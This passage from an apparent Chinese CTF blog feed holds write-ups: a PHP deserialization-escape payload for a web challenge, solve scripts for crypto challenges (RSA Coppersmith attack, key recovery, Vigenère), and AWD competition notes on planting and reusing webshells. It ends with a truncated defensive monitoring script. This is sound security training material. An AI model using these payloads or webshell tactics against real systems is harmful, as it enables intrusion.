array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;xdsec&#x27;);</span><br><span class="line">$filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$key).&#x27;/i&#x27;;</span><br><span class="line">return preg_replace($filter,&#x27;hack!!!!&#x27;,$payload);</span><br></pre></td></tr></table></figure><p>php 关键字被替换为 hack!!!! 之后，从3个字符变成了5个字符，但是反序列化的时候由于 s:3 的存在，这个值仍然会被当作三个字符来处理，造成逃逸。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=phpphpphpphpphpphpphp&quot;;s:3:&quot;V0n&quot;;s:14:&quot;has_girlfriend&quot;;&#125;</span><br></pre></td></tr></table></figure><p>minil{7f3ea366-f5ab-463c-b511-af63d6dc7715}</p><p>题目思路来源<a href="https://github.com/XDSEC/moeCTF_2020">西电安全协会</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://ctf.xidian.edu.cn/challenges&quot;&gt;平台&lt;/a&gt;上只有web的题目，只写了web。比赛的时候应该还有其他的。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/XDSEC/moeCTF_2020/</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://zephyr-cyber.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Crypto</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/1870933427.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/1870933427.html</id>
    <published>2021-07-26T09:43:46.000Z</published>
    <updated>2022-12-13T12:22:53.520Z</updated>
    
    <content type="html"><![CDATA[<p>2021/10/21 更新了高位截肢</p><h1 id="高新区比赛"><a href="#高新区比赛" class="headerlink" title="高新区比赛"></a>高新区比赛</h1><p>V^3<br>好像是一个2017年的题改的<br>cnhongke{bf7e02677b4faab7808d1580fd5bb}<br>也可以手动爆破<br>就是按照对应关系<br>然后逐位加密<br>你会发现到第六个就开始变成对称了<br>所以手动跑5次就出结果了<br>exp都多余了<br>附上exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_l</span>(<span class="params">idx, s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s[idx:] + s[:idx]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ct, k1, k2</span>):</span></span><br><span class="line">    s = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;</span></span><br><span class="line">    t = [[_l((i + j) % <span class="built_in">len</span>(s), s) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">    i1 = <span class="number">0</span></span><br><span class="line">    i2 = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> t[s.find(c)][s.find(k1[i1])][s.find(k2[i2])] == a:</span><br><span class="line">                decrypted += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        i1 = (i1 + <span class="number">1</span>) % <span class="built_in">len</span>(k1)</span><br><span class="line">        i2 = (i2 + <span class="number">1</span>) % <span class="built_in">len</span>(k2)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">p, k1, k2</span>):</span></span><br><span class="line">    t = [[_l((i + j) % <span class="built_in">len</span>(s), s) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">    i1 = <span class="number">0</span></span><br><span class="line">    i2 = <span class="number">0</span></span><br><span class="line">    c = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> p:</span><br><span class="line">        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]</span><br><span class="line">        i1 = (i1 + <span class="number">1</span>) % <span class="built_in">len</span>(k1)</span><br><span class="line">        i2 = (i2 + <span class="number">1</span>) % <span class="built_in">len</span>(k2)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_key</span>(<span class="params">known_prefix, ciphertex</span>):</span></span><br><span class="line">    final_key = [<span class="string">&#x27;*&#x27;</span>] * <span class="number">14</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">            partial_candidate_key = [<span class="string">&#x27;*&#x27;</span>] * <span class="number">14</span></span><br><span class="line">            partial_candidate_key[pos] = c</span><br><span class="line">            partial_candidate_key[<span class="number">13</span> - pos] = c</span><br><span class="line">            key = <span class="string">&quot;&quot;</span>.join(partial_candidate_key)</span><br><span class="line">            res = encrypt(known_prefix, key, key[::-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> res[pos] == ciphertex[pos]:</span><br><span class="line">                final_key[pos] = c</span><br><span class="line">                final_key[<span class="number">13</span> - pos] = c</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(final_key)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(final_key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    ciphertext = <span class="string">&quot;POR4dnyTLHBfwbxAAZhe&#125;&#125;ocZR3Cxcftw9&quot;</span></span><br><span class="line">    key = recover_key(<span class="string">&quot;SECCON&#123;&quot;</span>, ciphertext)</span><br><span class="line">    flag = decrypt(ciphertext, key, key[::-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="RSArepeat"><a href="#RSArepeat" class="headerlink" title="RSArepeat"></a>RSArepeat</h1><p>这题好像也有层一样的，比赛真lao<br>给出加密脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import os</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = gmpy2.next_prime(bytes_to_long(os.urandom(32) * 10))</span><br><span class="line">q = getPrime(2048)</span><br><span class="line">n = p * q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = 65537</span><br><span class="line">c = pow(m, e, n)</span><br><span class="line">print &#x27;n = &#x27; + str(n)</span><br><span class="line">print &#x27;c = &#x27; + str(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">运行结果输出</span><br><span class="line"># n = 9120210412817098868567410854637632250220555881403526554620639158581419400118706476426462580532569560128403528542849222604236640862674516611277130361890497616002043535833874824203278779255224103895976559478230598208736638548838369515266506758788653023380759388265524679357661867344583727639009050611035809615332415345615636794183389139631751072725812173232153921977529854299720035907475080123728133963132357285009229616899363413864250134103133772163607484794238528972871955212167583918722247406108717508117668301570190879613631465451744135100528987401664293214977426648232669628002711796584477405954390921585168542545024508132280795239187047607902042772074354512983547626983416047058674495234725402709185065533866399101327869049927071762987405052014360342557346201760417195526717659432120957024932822171629034785982161149134423193624715061013742839402782240625571812632970088905336230003285927069650264756078977556405903281928093668669291639199556779542688708405151017597677182338101624350346890556571828242761503472862589187188272783083175514693346986425145048900560704517281059296515380916946885637766528669652741939121435925118622627340581156923111326642804173809225000120356084999577920000481451709828075752253192537628742219663830938886966680564258836058435847445136469870523064012091603727249413340707659477419033271750976011384443208371660411376327908639483034074911057106131325663</span><br><span class="line"># c = 7068462753085070298092306006815948822917293261569147262935876173777154611330212172780298815871946045639185357656186163809499649889823797927617022879328397754544340874952687572138224768719999154448738757631265317915591819395360957051438805269461772096089208044993726972263528636921213722053915213474520713305628933165329554039041526341429811011879399124487420973883220496337343697082485151325947637134492168684404895651666064423117891350949942888278577264641878267652440305311472437072576068073588628794693349303196170011208043072754814062079404857657352761995684725014730958374555123902870761944058212939416619872746207245705213743023048901892977114871581000445118225605980711967279184600832881914000747237143653411293658641093111449235793736446421524719927367452081557329271167988711131750096910582920748875147684842547191116046110455610485921697703084407073334158845880179092914138111196153821093666870713318435216431977100255451151613217255214311447270315317924828002186873831048826117341746203538919869858723643158591679168166815433400943179342639989830429265410316662281946735133048179580170395697284908451588172527612828357594205617900793644449780703541620423822874332895281227408264377675840472406248296158342659308845264164232068007825845287325024564804783116616695927303806931940737550484802677095488750998780934178991718038605826623684585430755074719975767565185371149546480577</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/CRYPTO/gaoxinqu1.jpg" alt="avatar"><br><img src="/img/CRYPTO/gaoxinqu2.jpg" alt="avatar"></p><p>附上exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @FileName: tt.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">5723803231105438067621879312731287221934357097569268166420520040038029065761152553810494005387890506233399584147246538077002208499639437803910245817342952372458171365752480055753844375305610474395282822742943102904320741363812652705261682747336617279332644951905181705937705454682585492345619282271549850191266841799115355201225481894665469006243078988838181049476985523095183211083306888898330855716843411424493132244378006508444594329543929521327878717314543259397842391141445238073295183064204038877358053346160904246766744058035260700906186262991418344028036927076898224775513313992135215728859733003918328707361999295628679324987941544108516966440200369017207031702010292125100166826894159577761774445100777211415862293977599736904535299914065534202980062824965765410888738320552504576390375348702993646394541895827629891842496139670703262245710062952138603857926812293927639685763696276258111848707179034963859209200388611940617575570592428927246122690317085150458638646993030523460057013506016279214894927343923461607646478524983809407592464446504390449868558006440884166283766345457345779137687215125369153544179042534504852071842244821976629524307628462619103368289645015324069375881393414723379127777033799199839545069927720992165031027897683055528657202955467661225465098604530590852960596629917086084805687598732530884961789893076147057895925224397540225533098516204541840889</span></span><br><span class="line">t=bytes_to_long((<span class="string">&#x27;\x00&#x27;</span>*<span class="number">31</span>+<span class="string">&#x27;\x01&#x27;</span>)*<span class="number">10</span>)</span><br><span class="line"><span class="comment">#print t</span></span><br><span class="line">K = Zmod(n)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(K)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100000</span>):</span><br><span class="line">    r =(x *t +i).monic().small_roots(beta=<span class="number">0.45</span>)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        <span class="built_in">print</span> i,r</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="维吉尼亚"><a href="#维吉尼亚" class="headerlink" title="维吉尼亚"></a>维吉尼亚</h1><p>听名字就知道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vvr Ifnvaus Bdwokv Gbtrzsa Vkqgofntja rrlznxk eflvkozjcdue rs “mzg oez ff pjkhvtx ok kqzioeg vgfsf.” Zyil au vvykokaeoyrp avuwfnzv, bnl fcry eom ucdgaie mzg qhxiegl dfrguta gh huk wixdf ce oks ijggrtk-dtq uqvketbxkq sulnwsvwbtj. Taw fssoeimaqb sutulwu gbrvlr gp huk towwu hugk htng prke ulwf tbx teglwfvkj th wpoorv sxutsg ifmfmpwpgkihf. Dig iiyilquegghr fqknjryl wpqbsgalkgg zath fgts gnrn mzkg: vz uetdu kvzy mxujoaojml xqf rtjukapu vtkezjkhl, zvcafkehkj fhj glpnrnzapu fktrxl msly, grhlqqbrj fhj cignvnmaeogoeg nkgff, kcevltcaot anuvwbtj agv gzrikihfu, rvmzttd eofn, rnw eqfr. Cztagwh nzkefhvwam ko ijqjvjv a vgodykke vzcfnikekabogofn, pw ychru stq vvnz dowwtb pxppmgifnvyy bfxcybvs mzg ggauy hx oognvmtlkqnr kevzpwdavs ygt grilrbfi rvmzttd kbsuimtlkca, ypsmwog, ntu dbkvfvhltxv eczvlttlkcay rgtapgg guvxjuoeorl tlvopqj. CgZqbtQv&#123;3ayuc4r633096o2737&#125;</span><br></pre></td></tr></table></figure><p>直接维吉尼亚枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The Concise Oxford English Dictionary defines cryptography as “the art of writing or solving codes.” This is historically accurate, but does not capture the current breadth of the field or its present-day scientific foundations. The definition focuses solely on the codes that have been used for centuries to enable secret communication. But cryptography nowadays encompasses much more than this: it deals with mechanisms for ensuring integrity, techniques for exchanging secret keys, protocols for authenticating users, electronic auctions and elections, digital cash, and more. Without attempting to provide a complete characterization, we would say that modern cryptography involves the study of mathematical techniques for securing digital information, systems, and distributed computations against adversarial attacks. CnHongKe&#123;3afca4d633096b2737&#125;</span><br></pre></td></tr></table></figure><p>真lao</p><h1 id="高位截肢"><a href="#高位截肢" class="headerlink" title="高位截肢"></a>高位截肢</h1><p>題目源代碼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;********************************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= next_prime(randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = getprime(<span class="number">512</span>)</span><br><span class="line">q = getprime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">mod = []</span><br><span class="line">[mod.append(getprime(<span class="number">128</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line">[res.append(c%mod[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>)]</span><br><span class="line"><span class="built_in">print</span>(n,(p&gt;&gt;<span class="number">128</span>)&lt;&lt;<span class="number">128</span>),mod,res)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></span><br><span class="line"><span class="string">36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414288774195411449434676147898363218552160256</span></span><br><span class="line"><span class="string">[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841)]</span></span><br><span class="line"><span class="string">[17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730)]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>高位攻擊恢復p+crt<br>給大家推薦幾個高位攻擊回復p的blog<br><a href="https://blog.csdn.net/lostnerv/article/details/106009127">https://blog.csdn.net/lostnerv/article/details/106009127</a></p><p><a href="https://www.jianshu.com/p/e407be39a22b">https://www.jianshu.com/p/e407be39a22b</a></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#高位p</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">n = 3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></span><br><span class="line"><span class="string">pbar = 36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</span></span><br><span class="line"><span class="string">kbits = 128</span></span><br><span class="line"><span class="string">print(&quot;upper %d bits (of %d bits) is given&quot; % (pbar.nbits()-kbits, pbar.nbits()))</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + pbar</span></span><br><span class="line"><span class="string">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]  # find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"><span class="string">p = x0 + pbar</span></span><br><span class="line"><span class="string">print(&quot;p:&quot;, p)</span></span><br><span class="line"><span class="string">#crt求c</span></span><br><span class="line"><span class="string">crt([17514122934988110165886587218707943859589, 828023569353871016099054873610645592579, 3834965867062595899595546144451189629655, 5083410101797762407471893731877939884166, 6199590917760184276466050254032811548454, 208337506454727094683323122852921121527, 5210709327454808237359999225611588134922, 239093795148407379152016295908193630983, 29793049900271876372064873251244672365333, 1641943491807405218384351799880631607416, 1685895805013787734204509484411577153108, 1511298522529374764380482522275435302730],[127358722814661886628344839530462144916373, 1569005233424413714924223862235964763229, 15953826944429720811716497916877126603181, 22667750449179799152236917772041505492557, 7259500259309895932387328648172298540473, 1216723397014858024629084355784570444737, 5803969258694833349275399163572927306963, 2847514965593473340352693322675908465517, 55965603506094486681210827499140188004581, 3758825246939161175629619499256754206153, 9865309015695677187200661453839724337633, 1985189335531812324455545509044214546841])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c = <span class="number">1077233712188252453962763215420078090384941182152999954278038468778840824135535740613334922110769959923025621861732351020130627648669752220543773285487384058164614139587422610914396593954389899763791857297268825420364912075493471765126196898848111738107851858382589951634394904231520912326280908229934082041817</span></span><br><span class="line">n = <span class="number">3216831712236484919804716473942409526434016529181790011140718891645020999952523287950679312500771653918738887189899203815116997399422419456666136527466294225647700744715569996552708989626431982330367733125015062070399091789218760399060531383324158096784030850407432126491091299460659042468401054516052600467997</span></span><br><span class="line">p = <span class="number">36691536769373164488130311421517753226870999465362409179446664596323017708216823951466573340643687346264018616414289061014410434943387973225734363385787789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, <span class="built_in">int</span>(d), n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>flag{5bb5e0a9d48f44a3770253875f263810}<br><img src="/img/CRYPTO/gaowei1.jpg" alt="avatar"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2021/10/21 更新了高位截肢&lt;/p&gt;
&lt;h1 id=&quot;高新区比赛&quot;&gt;&lt;a href=&quot;#高新区比赛&quot; class=&quot;headerlink&quot; title=&quot;高新区比赛&quot;&gt;&lt;/a&gt;高新区比赛&lt;/h1&gt;&lt;p&gt;V^3&lt;br&gt;好像是一个2017年的题改的&lt;br&gt;cnhongk</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://zephyr-cyber.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>AWD</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/173175039.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/173175039.html</id>
    <published>2021-07-22T09:43:46.000Z</published>
    <updated>2022-12-13T12:22:37.011Z</updated>
    
    <content type="html"><![CDATA[<ol><li>给的是ctf低权限账号，但是中间件运行的是www-data权限，通常比ctf权限高，有些马用ssh上去删不掉，可以先传个自己的shell然后去删，当然得做一个防止被偷家的措施，比如说加一个if (‘xxx’===md5(key))的操作。也可以用www-data去对文件和目录做权限的修改等操作。</li><li>黑吃黑，直接用别的队伍上传的shell。</li><li>不是特别大型的比赛没有那么多的时间去审漏洞，通常用nday直接打，或者内置的shell后门。</li><li>批量拿flag并自动提交平台；自动备份与恢复自己的靶机文件。网上找的确实不会用</li></ol><h1 id="AWD线下赛防守脚本："><a href="#AWD线下赛防守脚本：" class="headerlink" title="AWD线下赛防守脚本："></a>AWD线下赛防守脚本：</h1><p>1.该脚本基于python，可直接在linux靶机上运行。</p><p>2.开局直接运行起来，会自动对web目录进行备份，并建立hash索引。当web目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。</p><p>3.无法避免的缺点：由于条件竞争，如果对方在我们删除shell之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">-*- coding: utf-<span class="number">8</span> -*-<span class="comment">#</span></span><br><span class="line">awd文件监控脚本</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ListDir</span>(<span class="params">path</span>):</span> <span class="comment"># 获取网站所有文件</span></span><br><span class="line"></span><br><span class="line"><span 